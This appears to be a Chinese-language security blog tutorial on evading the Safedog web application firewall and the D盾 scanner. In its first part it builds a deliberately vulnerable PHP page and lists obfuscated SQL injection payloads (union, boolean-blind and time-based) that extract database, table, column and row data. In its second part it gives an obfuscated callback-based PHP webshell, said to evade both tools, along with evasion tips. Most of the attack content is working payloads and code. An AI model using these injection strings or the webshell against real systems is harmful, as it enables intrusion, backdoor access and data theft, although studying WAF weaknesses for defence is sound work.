0x00 前言
最近看了不少关于WAF绕过的文章，想把理论深化到实践当中去，于是就有了您正在看的这篇文章，这篇文章分为两大部分，分别写的是SQL注入相关的WAF绕过和一句话木马免杀相关的WAF绕过，本文用来做测试的WAF是安全狗（4.0最新版），在一句话木马免杀的章节也会提到一些绕过D盾的技巧。

 

0x01 绕过安全狗继续SQL注入
其实说白了，绕过WAF就是混淆你的SQL语句，让它以另一种方式呈现出来，以绕过WAF的黑名单正则表达式匹配，至于具体的混淆方法，网络上有很多的文章已经讲的够详细了，在这里我就直接进入实战环节，不在讲具体方法和原理。

测试环境：WIN10 + Apache +php5.4.45 + mysql5.5.53 + 安全狗4.0版本

测试代码（inject.php）如下：

<?php

$id = $_GET['id'];

$con = mysql_connect("localhost","root","root");

if (!$con){die('Could not connect: ' . mysql_error());}

mysql_select_db("dvwa", $con);

$query = "SELECT first_name,last_name FROM users WHERE user_id = '$id'; ";

$result = mysql_query($query)or die('<pre>'.mysql_error().'</pre>');

while($row = mysql_fetch_array($result))

{

 echo $row['0'] . "&nbsp" . $row['1'];

 echo "<br />";

}

echo "<br/>";

echo $query;

mysql_close($con);

?>
首先是注入点测试：

直接上

 and '1'='1
(https://p5.ssl.qhimg.com/t011cd86a0315a8152d.jpg)

预料之内，果然被拦截，猜测可能是关键字and被过滤，修改and为&&，urlencode后为%26%26
(https://p2.ssl.qhimg.com/t01f4c4d41f2a32f18e.jpg)



成功绕过安全狗。

当然了，只能判断注入点是肯定没有任何任意的，下面我们来尝试用unionselect语句来提取一下数据，直接上union select语句肯定被拦截，我就不再截图了。

这里我们主要用的绕过方法是：

1.利用()代替空格

2.利用mysql特性/*!*/执行语句

3.利用/**/混淆代码

我给出的注入语句是：

1' union/*%00*//*!50010select*/(database/**/()),(user/**/())%23
可以看到，成功注入没有拦截

(https://p3.ssl.qhimg.com/t012ad227fa9626419a.jpg)

这里要注意的几点是：

1.mysql关键字中是不能插入/**/的，即se/**/lect是会报错的，但是函数名和括号之间是可以加上/**/的,像database/**/()这样的代码是可以执行的

2./*!*/中间的代码是可以执行的，其中50010为mysql版本号，只要mysql大于这个版本就会执行里面的代码

3.数据或者函数周围可以无限嵌套()

4.利用好%00

同样的道理，我们可以利用上述方法爆出当前数据库的数据表：

(https://p0.ssl.qhimg.com/t012ad227fa9626419a.jpg)

当然，在真实环境下直接union select数据的注入点是非常少见的，还是盲注占多数，按照上面的思路方法我们可以非常轻松的测试出绕过安全狗的盲注语句，我测试了好长时间，总结出的语句如下：

判断： 1'/**/%26%261%3d2%23

判断列数： 1' order by 2%23


关联查询爆出用户和数据库： 1%27%20union/*%00*//*!50010select*/(database/**/()),(user/**/())%23

关联查询爆出数据表： %27%20union/*%00*//*!50010select*/((group_concat(table_name))),null/**/from/**/((information_schema.TABLES))/**/where/**/TABLE_SCHEMA%3d(database/**/())%23

关联查询爆出字段值： %27%20union/*%00*//*!50010select*/((group_concat(COLUMN_NAME))),null/**/from/**/((information_schema.columns))/**/where/**/TABLE_NAME%3d%27users%27%23

关联查询提取数据： %27%20union/*%00*//*!50010select*/((group_concat(first_name))),null/**/from/**/((users))%23


盲注爆出数据库： 1' and substr(database/**/(),1,1)%3d'1'%23

盲注爆出数据表： 1'/*%00*/and substr((/*!50010select*/((group_concat(table_name)))/**/from/**/((information_schema.TABLES))/**/where/**/TABLE_SCHEMA%3d(database/**/())),1,1)%3d'1'%23

盲注爆出字段值： 1'/*%00*/and substr((/*!50010select*/((group_concat(COLUMN_NAME)))/**/from/**/((information_schema.columns))/**/where/**/TABLE_NAME%3d%27users%27),1,1)%3d'1'%23

盲注提取数据： 1'/*%00*/and substr((/*!50010select*/((group_concat(first_name)))/**/from/**/((users))),1,1)%3d'1'%23


基于时间的盲注爆出数据库： 1'/*%00*/and (select case when (substr(database/**/(),1,1) like 'd') then sleep/**/(3) else 0 end)%23

基于时间的盲注爆出数据表： 1'/*%00*/and (select case when (substr((/*!50010select*/((group_concat(table_name)))/**/from/**/((information_schema.TABLES))/**/where/**/TABLE_SCHEMA%3d(database/**/())),1,1) like 'd') then sleep/**/(3) else 0 end)%23

基于时间的盲注爆出字段值： 1'/*%00*/and (select case when (substr((/*!50010select*/((group_concat(COLUMN_NAME)))/**/from/**/((information_schema.columns))/**/where/**/TABLE_NAME%3d%27users%27),1,1) like 'd') then sleep/**/(3) else 0 end)%23

基于时间的盲注提取数据： 1'/*%00*/and (select case when (substr((/*!50010select*/((group_concat(first_name)))/**/from/**/((users))),1,1) like 'd') then sleep/**/(3) else 0 end)%23
上列的是关联查询注入、盲注、基于时间的盲注从获取数据库名一直到获取表名、字段名、数据值的所有过狗语句。

可以看到安全狗完全被Bypass：

(https://p3.ssl.qhimg.com/t01bcb5997d7e5d928c.jpg)

当然了，绕过的方法还是非常多的，ske师傅提供了另一种奇葩的绕过思路：

Union -> /*!Union/*/**/

Select -> /*!/*!Select*/

Database() -> /*!database/*/**//*!/*!()*/
使用这种方法SQL语句依然可以正确执行，而且会完美过狗！

但是这里比较坑的一点是安全狗3.5版本会拦截关键字information_schema，这样利用起来就比较麻烦了，不过私神还是提供了一种方法绕过：

当mysql版本>=5.6时，可以用如下语句代替：

Select table_name from mysql.innodb_table_stats where database_name = database();
当然了，4.0版本还是非常容易绕过的！

思路总结：

1.构造利用sql语句

2.利用局部分析的方法判断被过滤的是哪些内容

3.分析过滤规则尝试绕过

 

0x02 绕过安全狗和D盾写入WebShell
对于免杀WebShell，给我最大启发的一篇文章还是phithon师傅写的一篇讲“回调后门”的文章，所谓的“回调后门”，其实就是找一个有回调函数参数的函数（似乎有点绕），具体细节在phithon师傅的这篇文章中已经讲的非常清楚了，如果有小白不理解的话，建议仔细阅读此文章链接之后再继续阅读下文。

链接如下：

https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html

这篇文章思路特别好而且总结的很全，唯一的问题就是这篇文章是在三年前写的，文章中提供的WebShell已经能被主流的安全工具完美查杀，因此我们需要对文章中给出的WebShell进行改进。

我随便取了一个回调后门如下：
(https://p5.ssl.qhimg.com/t016c86fbd8fb00a802.jpg)

测试了一下，被安全狗完美拦截：

(https://p5.ssl.qhimg.com/t014cf18b963808db42.jpg)


安全狗很容易绕过，只要把base64_decode()这个解密函数去掉就行了：

(https://p2.ssl.qhimg.com/t01aab10eba269feaa7.jpg)

但是D盾还是完美查杀：

(https://p0.ssl.qhimg.com/t012a1a40343e8af08c.jpg)

尝试创建一个类并利用构造函数赋值来混淆代码：

<?php
class test{
 public $e;
 function __construct()
 {
 $this->e = $_GET['e'];
 }
}
$t = new test();
$s=$_REQUEST['pass'];
$arr=array($s,'test');
uasort($arr,$t->e);

(https://p5.ssl.qhimg.com/t0190d30fa89ccf7c40.jpg)

可以看到安全狗和D盾都已经查杀不出来了

当然了，这只是一种思路，我们还可以利用之前混淆SQL语法的思路来免杀webshell，即在代码中添加()和/**/

做测试的webshell如下：

(https://p2.ssl.qhimg.com/t011772722f9e1307f7.jpg)

混淆之后成功逃过D盾和安全狗的查杀：

(https://p4.ssl.qhimg.com/t010cba056befbf3cbb.jpg)

注意这个代码比之前的多了一个()和一个/**/

最近在先知平台上还看到了一个用反序列化制作免杀WebShell的方法也很精巧，链接如下：

https://xianzhi.aliyun.com/forum/topic/2202

WebShell免杀思路总结：

1.输入点：把$_GET改为$_SERVER，或者用file_get_contents()函数以及include语句作为输入点

2.核心方法：利用有回调函数参数的函数作为代码执行的入口点

3.代码混淆：利用好()和/**/以及各种空白符，利用类的构造函数/析构函数

 

0x03 后记
切记，没有绕不过的WAF，基于正则表达式匹配的WAF都是比较容易绕过的，WAF可以当做一种缓解措施但一定不要将它作为最终的防御手段！
